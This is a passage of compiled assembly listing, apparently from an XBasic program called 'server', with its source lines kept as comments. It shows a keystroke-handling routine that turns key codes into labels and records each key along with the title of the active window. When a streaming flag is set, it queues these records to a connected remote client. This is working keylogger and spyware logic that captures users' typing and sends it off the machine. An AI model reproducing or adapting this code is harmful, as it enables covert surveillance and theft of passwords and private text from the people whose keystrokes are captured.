	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1211] CASE $$VK_F23			:key = "[F23]"
	jmp	end.select.0062.server			;;; i69
case.0062.0045.server:
	mov	eax,134			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0046.server			;;; i71
	mov	eax,addr @_string.029C.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1212] CASE $$VK_F24			:key = "[F24]"
	jmp	end.select.0062.server			;;; i69
case.0062.0046.server:
	mov	eax,135			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0047.server			;;; i71
	mov	eax,addr @_string.029E.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1213] CASE $$VK_NUMLOCK		:key = "[NUMLOCK]"
	jmp	end.select.0062.server			;;; i69
case.0062.0047.server:
	mov	eax,144			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0048.server			;;; i71
	mov	eax,addr @_string.029F.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1214] CASE $$VK_SCROLL		:key = "[SCROLL]"
	jmp	end.select.0062.server			;;; i69
case.0062.0048.server:
	mov	eax,145			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0049.server			;;; i71
	mov	eax,addr @_string.02A0.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1215] CASE $$VK_LSHIFT		:key = "[L SHIFT"
	jmp	end.select.0062.server			;;; i69
case.0062.0049.server:
	mov	eax,160			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004A.server			;;; i71
	mov	eax,addr @_string.02A1.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1216] CASE $$VK_RSHIFT		:key = "[R SHIFT"
	jmp	end.select.0062.server			;;; i69
case.0062.004A.server:
	mov	eax,161			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004B.server			;;; i71
	mov	eax,addr @_string.02A2.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1217] CASE $$VK_LCONTROL		:key = "[L CONTROL"
	jmp	end.select.0062.server			;;; i69
case.0062.004B.server:
	mov	eax,162			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004C.server			;;; i71
	mov	eax,addr @_string.02A3.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1218] CASE $$VK_RCONTROL		:key = "[R CONTROL"
	jmp	end.select.0062.server			;;; i69
case.0062.004C.server:
	mov	eax,163			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004D.server			;;; i71
	mov	eax,addr @_string.02A4.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1219] CASE $$VK_LMENU			:key = "[L ALT"'"[LMENU]"
	jmp	end.select.0062.server			;;; i69
case.0062.004D.server:
	mov	eax,164			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004E.server			;;; i71
	mov	eax,addr @_string.02A5.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1220] CASE $$VK_RMENU			:key = "[R ALT"'"[RMENU]"
	jmp	end.select.0062.server			;;; i69
case.0062.004E.server:
	mov	eax,165			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.004F.server			;;; i71
	mov	eax,addr @_string.02A6.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1221] CASE $$VK_ATTN			:key = "[ATTN]"
	jmp	end.select.0062.server			;;; i69
case.0062.004F.server:
	mov	eax,246			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0050.server			;;; i71
	mov	eax,addr @_string.02A8.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1222] CASE $$VK_CRSEL			:key = "[CRSEL]"
	jmp	end.select.0062.server			;;; i69
case.0062.0050.server:
	mov	eax,247			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0051.server			;;; i71
	mov	eax,addr @_string.02AA.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1223] CASE $$VK_EXSEL			:key = "[EXSEL]"
	jmp	end.select.0062.server			;;; i69
case.0062.0051.server:
	mov	eax,248			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0052.server			;;; i71
	mov	eax,addr @_string.02AC.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1224] CASE $$VK_EREOF			:key = "[EREOF]"
	jmp	end.select.0062.server			;;; i69
case.0062.0052.server:
	mov	eax,249			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0053.server			;;; i71
	mov	eax,addr @_string.02AE.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1225] CASE $$VK_PLAY			:key = "[PLAY]"
	jmp	end.select.0062.server			;;; i69
case.0062.0053.server:
	mov	eax,250			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0054.server			;;; i71
	mov	eax,addr @_string.02B0.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1226] CASE $$VK_ZOOM			:key = "[ZOOM]"
	jmp	end.select.0062.server			;;; i69
case.0062.0054.server:
	mov	eax,251			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0055.server			;;; i71
	mov	eax,addr @_string.02B2.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1227] CASE $$VK_NONAME		:key = "[NONAME]"
	jmp	end.select.0062.server			;;; i69
case.0062.0055.server:
	mov	eax,252			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0056.server			;;; i71
	mov	eax,addr @_string.02B4.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1228] CASE $$VK_PA1			:key = "[PA1]"
	jmp	end.select.0062.server			;;; i69
case.0062.0056.server:
	mov	eax,253			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0057.server			;;; i71
	mov	eax,addr @_string.02B6.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1229] CASE $$VK_OEM_CLEAR		:key = "[OEM_CLEAR]"
	jmp	end.select.0062.server			;;; i69
case.0062.0057.server:
	mov	eax,254			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0058.server			;;; i71
	mov	eax,addr @_string.02B8.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1231] CASE $$VK_LWIN			:key = "[L WIN"' left windows key
	jmp	end.select.0062.server			;;; i69
case.0062.0058.server:
	mov	eax,91			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0059.server			;;; i71
	mov	eax,addr @_string.02B9.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1232] CASE $$VK_RWIN			:key = "[R WIN"' right windows key
	jmp	end.select.0062.server			;;; i69
case.0062.0059.server:
	mov	eax,92			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005A.server			;;; i71
	mov	eax,addr @_string.02BA.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1233] CASE $$VK_APPS			:key = "[CONTEXT"' application context menu
	jmp	end.select.0062.server			;;; i69
case.0062.005A.server:
	mov	eax,93			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005B.server			;;; i71
	mov	eax,addr @_string.02BB.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1235] 'CASE 32				:key = "[SPACE]"
;
; [1236] CASE 186				:key = ";"
	jmp	end.select.0062.server			;;; i69
case.0062.005B.server:
	mov	eax,186			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005C.server			;;; i71
	mov	eax,addr @_string.02BD.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1237] CASE 187				:key = "="
	jmp	end.select.0062.server			;;; i69
case.0062.005C.server:
	mov	eax,187			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005D.server			;;; i71
	mov	eax,addr @_string.02BF.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1238] CASE 188				:key = ","
	jmp	end.select.0062.server			;;; i69
case.0062.005D.server:
	mov	eax,188			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005E.server			;;; i71
	mov	eax,addr @_string.02C1.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1239] CASE 189				:key = "-"
	jmp	end.select.0062.server			;;; i69
case.0062.005E.server:
	mov	eax,189			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.005F.server			;;; i71
	mov	eax,addr @_string.02C3.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1240] CASE 190				:key = "."
	jmp	end.select.0062.server			;;; i69
case.0062.005F.server:
	mov	eax,190			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0060.server			;;; i71
	mov	eax,addr @_string.02C5.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1241] CASE 191				:key = "/"
	jmp	end.select.0062.server			;;; i69
case.0062.0060.server:
	mov	eax,191			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0061.server			;;; i71
	mov	eax,addr @_string.02C7.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1242] CASE 192				:key = "'"
	jmp	end.select.0062.server			;;; i69
case.0062.0061.server:
	mov	eax,192			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0062.server			;;; i71
	mov	eax,addr @_string.02C9.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1243] CASE 219				:key = "["
	jmp	end.select.0062.server			;;; i69
case.0062.0062.server:
	mov	eax,219			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0063.server			;;; i71
	mov	eax,addr @_string.02CB.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1244] CASE 220				:key = "\\"
	jmp	end.select.0062.server			;;; i69
case.0062.0063.server:
	mov	eax,220			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0064.server			;;; i71
	mov	eax,addr @_string.02CD.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1245] CASE 221				:key = "]"
	jmp	end.select.0062.server			;;; i69
case.0062.0064.server:
	mov	eax,221			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0065.server			;;; i71
	mov	eax,addr @_string.02CF.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1246] CASE 222				:key = "#"
	jmp	end.select.0062.server			;;; i69
case.0062.0065.server:
	mov	eax,222			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0066.server			;;; i71
	mov	eax,addr @_string.02D1.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1247] CASE 223				:key = "`"
	jmp	end.select.0062.server			;;; i69
case.0062.0066.server:
	mov	eax,223			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0062.0067.server			;;; i71
	mov	eax,addr @_string.02D3.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1249] CASE ELSE				:IF (vkey > 64) && (vkey < 91) THEN
	jmp	end.select.0062.server			;;; i69
case.0062.0067.server:
	mov	eax,d[ebp+8]			;;; i665
	cmp	eax,64			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jle	> A.149			;;; i467
	not	eax			;;; i468
A.149:
;+peep
	mov	ebx,d[ebp+8]			;;; i665
	cmp	ebx,91			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jge	> A.150			;;; i467
	not	ebx			;;; i468
A.150:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.0064.server			;;; i221
;
; [1250] IF !(GetKeyStatus($$VK_SHIFT) | GetKeyStatus($$VK_CAPITAL)) THEN
	push	16			;;; i656a
	call	func5C.server			;;; i619
; .xstk57.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	20			;;; i656a
	call	func5C.server			;;; i619
	mov	ebx,d[ebp-52]			;;; i665
	or	eax,ebx			;;; i763
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	test	eax,eax			;;; i220
	jz	>> else.0065.server			;;; i221
;
; [1251] vkey = vkey + 32
	mov	eax,d[ebp+8]			;;; i665
	add	eax,32			;;; i775
	mov	d[ebp+8],eax			;;; i670
;
; [1252] ELSE
	jmp	end.if.0065.server			;;; i107
else.0065.server:
;
; [1253] IF GetKeyStatus($$VK_SHIFT) && GetKeyStatus($$VK_CAPITAL) THEN vkey = vkey + 32
	push	16			;;; i656a
	call	func5C.server			;;; i619
	mov	d[ebp-52],eax			;;; i670
	push	20			;;; i656a
	call	func5C.server			;;; i619
	mov	ebx,d[ebp-52]			;;; i665
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.0066.server			;;; i221
	mov	eax,d[ebp+8]			;;; i665
	add	eax,32			;;; i775
	mov	d[ebp+8],eax			;;; i670
else.0066.server:
end.if.0066.server:
;
; [1254] END IF
end.if.0065.server:
;
; [1255] END IF
else.0064.server:
end.if.0064.server:
;
; [1256] key = CHR$(vkey)
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1257] END SELECT
end.select.0062.server:
;
; [1259] IF (state == $$ST_DOWN) THEN
	mov	eax,d[ebp+12]			;;; i665
	cmp	eax,1			;;; i684a
	jne	>> else.0067.server			;;; i219
;
; [1260] key = key + " DOWN]"
	mov	eax,[%57%key.server]			;;; i663a
	mov	ebx,addr @_string.02D5.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1261] ELSE
	jmp	end.if.0067.server			;;; i107
else.0067.server:
;
; [1262] IF (state == $$ST_UP) THEN
	mov	eax,d[ebp+12]			;;; i665
	cmp	eax,2			;;; i684a
	jne	>> else.0068.server			;;; i219
;
; [1263] key = key + " UP]"
	mov	eax,[%57%key.server]			;;; i663a
	mov	ebx,addr @_string.02D6.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1264] END IF
else.0068.server:
end.if.0068.server:
;
; [1265] END IF
end.if.0067.server:
;
; [1267] hwnd = GetForegroundWindow ()
#ifdef EventProcess.hwnd
#undef EventProcess.hwnd
#endif
#define EventProcess.hwnd ebp-56	; exposes local variable 'hwnd'
;
;
; [0] EXTERNAL FUNCTION GetForegroundWindow ()
	call	_GetForegroundWindow@0			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [1268] 'class$ = NULL$(64)
;
; [1269] 'GetClassNameA (hwnd,&class$, 63)
;
; [1271] len = GetWindowTextLengthA (hwnd) + 1
#ifdef EventProcess.len
#undef EventProcess.len
#endif
#define EventProcess.len ebp-60	; exposes local variable 'len'
;
;
; [0] EXTERNAL FUNCTION GetWindowTextLengthA (hwnd)
	push	[ebp-56]			;;; i674a
	call	_GetWindowTextLengthA@4			;;; i619
	add	eax,1			;;; i775
	mov	d[ebp-60],eax			;;; i670
;
; [1272] title = SPACE$(len)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1273] GetWindowTextA (hwnd, &title,len)
;
; [0] EXTERNAL FUNCTION GetWindowTextA (hwnd, lpString, cch)
	mov	eax,d[ebp-40]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	push	[ebp-60]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_GetWindowTextA@12			;;; i619
;
; [1274] title = CSTRING$(&title)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i642
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1276] IF (title == "") THEN THEN title = "notitle"
	mov	eax,[ebp-40]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	jne	>> else.0069.server			;;; i219
	mov	eax,addr @_string.02D9.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0069.server:
end.if.0069.server:
;
; [1277] IF (title != atitle) THEN
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,[%atitle.server]			;;; i663a
	call	%_string.compare.vv			;;; i690
	je	>> else.006A.server			;;; i219
;
; [1278] atitle = title
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %atitle.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1279] ltitle$ = "\1\2\1\2->["+title+"]\1\2"
#ifdef EventProcess.ltitle$
#undef EventProcess.ltitle$
#endif
#define EventProcess.ltitle$ ebp-64	; exposes local variable 'ltitle$'
;
	mov	eax,addr @_string.02DB.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.02DC.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1280] AppendEventLog (@ltitle$)
	push	[ebp-64]			;;; i674a
	call	func59.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp-64],ecx			;;; i670
;
; [1281] END IF
else.006A.server:
end.if.006A.server:
;
; [1283] AppendEventLog (@key)
	push	[%57%key.server]			;;; i672a
	call	func59.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[%57%key.server],ecx			;;; i668
;
; [1284] IF (#StreamKey == $$TRUE) && client && (state == $$ST_PRESSED)THEN
	mov	eax,d[%#StreamKey.server]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.151			;;; i467
	not	eax			;;; i468
A.151:
;+peep
	mov	ebx,d[%client.server]			;;; i663a
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	mov	ebx,d[ebp+12]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.152			;;; i467
	not	ebx			;;; i468
A.152:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.006B.server			;;; i221
;
; [1285] IF (key == " ") THEN key = "[SPACE]"
	mov	eax,[%57%key.server]			;;; i663a
	mov	ebx,addr @_string.0230.server			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> else.006C.server			;;; i219
	mov	eax,addr @_string.02DE.server			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %57%key.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.006C.server:
end.if.006C.server:
;
; [1286] QueueMsg ($$QM_WRITE,client,"_event KEY "+ltitle$ + key)
	mov	eax,addr @_string.02DF.server			;;; i663
	mov	ebx,[ebp-64]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%57%key.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[%client.server]			;;; i672a
	push	1			;;; i656a
	call	func6.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [1287] END IF
else.006B.server:
end.if.006B.server:
;
; [1289] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func57.server			;;; i258
;
; [1290] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventProcess.server:  ;;; Function end label for Assembly Programmers.
end.func57.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func57.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func57.server:
	mov	esi,[ebp-64]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EventProcess ()  *****
;  *****
;
; [1292] FUNCTION NetSleep (time)
.code
;
#ifdef NetSleep.time
#undef NetSleep.time
#endif
#define NetSleep.time ebp+8	; exposes function argument 'time'
;
align 16
_NetSleep.server@4:
;  *****
;  *****  FUNCTION  NetSleep ()  *****
;  *****
func51.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
